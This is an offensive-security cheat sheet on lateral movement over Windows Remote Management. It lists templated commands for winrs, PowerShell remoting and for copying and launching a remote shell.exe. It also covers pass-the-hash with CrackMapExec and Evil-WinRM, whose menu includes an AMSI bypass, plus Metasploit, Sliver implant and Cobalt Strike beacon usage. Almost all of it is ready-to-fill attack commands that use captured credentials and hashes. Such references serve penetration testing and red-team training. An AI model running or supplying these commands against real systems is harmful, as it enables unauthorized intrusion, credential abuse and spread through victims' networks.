# WinRM Lateral Movement

## 01 - Command Prompt

- Using `winrs.exe` to laterally spawn shells via WinRM

```
C:\> winrs -remote:<IP> <commands>

C:\> winrs -r:http://<IP>/wsman <commands>

C:\> winrs -r:<IP> -ad -u:<username> -p:<password> <commands>
```

## 02 - Powershell

### 2.1 - Start-Process

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Start-Process -FilePath C:\path\to\shell.exe -NoNewWindow -Credential $credential -WorkingDirectory c:\users\public
```

You can pass arguments as well when using `netcat` for example

`PS C:\> Start-Process -FilePath <C:\path\to\program.exe> -NoNewWindow -Credential $credential -ArgumentList ("<arg1>","<arg2>","<arg3>") -WorkingDirectory C:\Users\Public`

### 2.2 - Authenticate Remotely

```powershell
PS C:\> $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("<username>", $password)
$computer = "<IP>"
[System.Diagnostics.Process]::Start("<Commands>", $credential.Username, $credential.Password, $computer)
```

```powershell
PS C:\> $ip = New-PSSession -ComputerName <IP>

Copy-Item shell.exe -Destination "c:\users\public\" -ToSession $ip

icm -Session $ip -ScriptBlock {c:\users\public\shell.exe}
```

### 2.3 - Running WinRM cmdlets in Linux

`user@pentestos:~$ pwsh`

```powershell
PS /home/user> $creds = Get-Credential

PS /home/user> Enter-PSSession -ComputerName <IP> -Authentication Negotiate -Credential $creds
```

We can also **New-PSSession** feature to send commands via **Invoke-Command**

```powershell
PS /home/user> $session = New-PSSession -ComputerName <IP> -Authentication Negotiate -Credential $creds

PS /home/user> Invoke-Command -Session $session -ScriptBlock {hostname}
```

We can also pass multiple sessions as well

```powershell
PS /home/user> $multisession = New-PSSession -ComputerName <IP_1>,<IP_2>,<IP_n> -Authentication Negotiate -Credential $creds

PS /home/user> Invoke-Command -Session $multisession -ScriptBlock { hostname }
```

## 03 - CrackMapExec

`$ crackmapexec winrm <IP>/<CIDR> -u "<username>" -p "<password>" -d <domain_name>`

- Pass the Hash

`$ crackmapexec winrm <IP>/<CIDR> -u "<username>" -H "<ntlm_hash>" -d <domain_name>`

## 04 - Evil-WinRM

### 4.1 - Help Menu

```
*Evil-WinRM* PS C:\Users\user\Documents> menu

   ,.   (   .      )               "            ,.   (   .      )       .
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit
```

### 4.2 - Usage

`$ evil-winrm -i <IP> -r <domain_name> -u <username> -p "<password>"`

- Pass the Hash

`$ evil-winrm -i <IP> -r <domain_name> -u <username> -H "<ntlm_hash>"`

## 05 - Metasploit

```
msf > use exploit/windows/local/powershell_remoting
```

## 06 - Sliver

`sliver (IMPLANT_NAME) > winrm <IP> <command> <domain>\\<username> <password>`

## 07 - Cobalt Strike

### 7.1 - Jump

`beacon> jump <winrm | winrm64> <IP> <listener>`

### 7.2 - Remote-Exec

#### 7.2.1 - Execute Commands

`beacon> remote-exec winrm <IP> <cmdlets>`

## References

- [SS64 WinRS](https://ss64.com/nt/winrs.html)

- [Powershell Module New-CimSession](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2)

- [Powershell Module Get-CimSession](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/get-cimsession?view=powershell-7.2)

- [HarmJ0y PsRemoting.ps1](https://gist.github.com/HarmJ0y/4c37e43ba4865bdef2a8)